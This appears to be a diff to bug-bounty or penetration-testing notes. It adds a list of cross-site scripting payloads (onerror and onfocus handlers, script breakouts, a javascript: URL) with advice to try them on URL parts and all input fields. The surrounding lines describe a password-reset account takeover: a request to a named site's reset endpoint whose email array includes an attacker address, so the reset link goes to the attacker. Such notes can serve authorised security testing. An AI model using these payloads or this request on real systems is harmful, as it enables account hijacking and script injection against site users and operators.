@@ -9,7 +9,18 @@ Steps to repro:
 4) Now logout and use the password reset link which was mailed to "a@x.com" in step 2.
 5) Password will be changed.
 
+XSS/
 
+"><img src onerror=alert(1)>
+"autofocus onfocus=alert(1)//
+</script><script>alert(1)</script>
+'-alert(1)-'
+\'-alert(1)//
+javascript:alert(1)
+
+Try it on:
+- URL query, fragment & path;
+- all input fields.
 POST https://hq.breadcrumb.com/api/v1/password_reset HTTP/1.1
 with body like {"email_address":["admin@breadcrumb.com","attacker@evil.com"]}
 
